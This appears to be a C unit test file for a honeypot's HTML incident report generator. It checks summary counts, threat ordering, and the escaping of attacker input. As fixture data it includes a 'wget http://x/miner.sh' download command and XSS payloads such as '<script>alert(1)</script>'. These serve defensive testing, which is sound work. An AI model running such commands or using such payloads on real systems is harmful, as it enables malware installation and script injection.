#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "unity.h"
#include "db_check.h"
#include "storage/db.h"
#include "storage/report.h"

static char db_path[TEMP_DB_PATH_LEN];
static char html_path[TEMP_DB_PATH_LEN];
static struct db *db;
static char *html;
static FILE *summary;
static char *summary_buf;
static size_t summary_len;

void setUp(void)
{
    make_temp_db_path(db_path);
    make_temp_db_path(html_path);
    db = db_open(db_path);
    TEST_ASSERT_NOT_NULL(db);
    summary = open_memstream(&summary_buf, &summary_len);
    TEST_ASSERT_NOT_NULL(summary);
    html = NULL;
}

void tearDown(void)
{
    db_close(db);
    fclose(summary);
    free(summary_buf);
    free(html);
    unlink(db_path);
    unlink(html_path);
}

static int64_t add_incident(const char *ip, threat_level_t level, time_t first)
{
    struct incident inc = { .first_seen = first, .last_seen = first + 10, .level = level };
    event_set_str(inc.src_ip, sizeof inc.src_ip, ip);
    TEST_ASSERT_EQUAL_INT(0, db_save_incident(db, &inc));
    return inc.id;
}

static void add_event(int64_t incident, event_type_t type, const char *ip, time_t ts,
                      const char *user, const char *pass, const char *details)
{
    struct event ev;
    event_init(&ev, type, EV_SOURCE_HONEYPOT, ip);
    ev.timestamp = ts;
    event_set_str(ev.username, sizeof ev.username, user);
    event_set_str(ev.password, sizeof ev.password, pass);
    event_set_str(ev.details, sizeof ev.details, details);
    TEST_ASSERT_EQUAL_INT(0, db_insert_event(db, &ev, incident));
}

static const char *generate(void)
{
    TEST_ASSERT_EQUAL_INT(0, report_generate(db_path, html_path, summary));
    FILE *f = fopen(html_path, "r");
    TEST_ASSERT_NOT_NULL(f);
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);
    html = malloc((size_t)size + 1);
    TEST_ASSERT_NOT_NULL(html);
    TEST_ASSERT_EQUAL_size_t((size_t)size, fread(html, 1, (size_t)size, f));
    html[size] = '\0';
    fclose(f);
    fflush(summary);
    return html;
}

static void test_empty_database(void)
{
    const char *h = generate();
    TEST_ASSERT_NOT_NULL(strstr(h, "No incidents."));
    TEST_ASSERT_NOT_NULL(strstr(h, "</html>"));
    TEST_ASSERT_NOT_NULL(strstr(summary_buf, "incidents: 0 (HIGH 0, MEDIUM 0, LOW 0)"));
}

static void test_summary_and_tops(void)
{
    int64_t a = add_incident("45.1.2.3", THREAT_HIGH, 1000);
    int64_t b = add_incident("10.0.0.7", THREAT_LOW, 2000);
    add_event(a, EV_LOGIN_ATTEMPT, "45.1.2.3", 1001, "root", "123456", "");
    add_event(a, EV_LOGIN_ATTEMPT, "45.1.2.3", 1002, "root", "123456", "");
    add_event(a, EV_LOGIN_ATTEMPT, "45.1.2.3", 1003, "admin", "qwerty", "");
    add_event(a, EV_COMMAND, "45.1.2.3", 1004, "", "", "uname -a");
    add_event(a, EV_DOWNLOAD_ATTEMPT, "45.1.2.3", 1005, "", "", "wget http://x/miner.sh");
    add_event(b, EV_CONNECT, "10.0.0.7", 2000, "", "", "");

    const char *h = generate();
    TEST_ASSERT_NOT_NULL(strstr(summary_buf, "events: 6, unique IPs: 2"));
    TEST_ASSERT_NOT_NULL(strstr(summary_buf, "incidents: 2 (HIGH 1, MEDIUM 0, LOW 1)"));
    TEST_ASSERT_NOT_NULL(strstr(summary_buf, html_path));

    const char *passwords = strstr(h, "Top passwords");
    TEST_ASSERT_NOT_NULL(passwords);
    const char *top = strstr(passwords, "123456");
    const char *second = strstr(passwords, "qwerty");
    TEST_ASSERT_NOT_NULL(top);
    TEST_ASSERT_NOT_NULL(second);
    TEST_ASSERT_TRUE(top < second);

    TEST_ASSERT_NOT_NULL(strstr(h, "wget http://x/miner.sh"));
    TEST_ASSERT_NOT_NULL(strstr(h, "uname -a"));
}

static void test_high_incident_listed_first(void)
{
    add_incident("1.1.1.1", THREAT_LOW, 5000);
    add_incident("2.2.2.2", THREAT_HIGH, 1000);
    add_incident("3.3.3.3", THREAT_MEDIUM, 3000);

    const char *h = generate();
    const char *high = strstr(h, "2.2.2.2");
    const char *medium = strstr(h, "3.3.3.3");
    const char *low = strstr(h, "1.1.1.1");
    TEST_ASSERT_NOT_NULL(high);
    TEST_ASSERT_NOT_NULL(medium);
    TEST_ASSERT_NOT_NULL(low);
    TEST_ASSERT_TRUE(high < medium);
    TEST_ASSERT_TRUE(medium < low);
}

static void test_attacker_data_is_escaped(void)
{
    int64_t a = add_incident("6.6.6.6", THREAT_MEDIUM, 1000);
    add_event(a, EV_LOGIN_ATTEMPT, "6.6.6.6", 1001, "<b>x</b>",
              "\"><script>alert(1)</script>", "");
    add_event(a, EV_COMMAND, "6.6.6.6", 1002, "", "", "echo '<img src=x onerror=alert(1)>' & ls");

    const char *h = generate();
    TEST_ASSERT_NULL(strstr(h, "<script>"));
    TEST_ASSERT_NULL(strstr(h, "<img"));
    TEST_ASSERT_NULL(strstr(h, "<b>x"));
    TEST_ASSERT_NOT_NULL(strstr(h, "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"));
    TEST_ASSERT_NOT_NULL(strstr(h, "echo &#39;&lt;img src=x onerror=alert(1)&gt;&#39; &amp; ls"));
}

static void test_missing_database_fails(void)
{
    TEST_ASSERT_EQUAL_INT(-1, report_generate("/nonexistent_dir/x.db", html_path, NULL));
}

static void test_unwritable_report_fails(void)
{
    TEST_ASSERT_EQUAL_INT(-1, report_generate(db_path, "/nonexistent_dir/report.html", NULL));
}

int main(void)
{
    UNITY_BEGIN();
    RUN_TEST(test_empty_database);
    RUN_TEST(test_summary_and_tops);
    RUN_TEST(test_high_incident_listed_first);
    RUN_TEST(test_attacker_data_is_escaped);
    RUN_TEST(test_missing_database_fails);
    RUN_TEST(test_unwritable_report_fails);
    return UNITY_END();
}
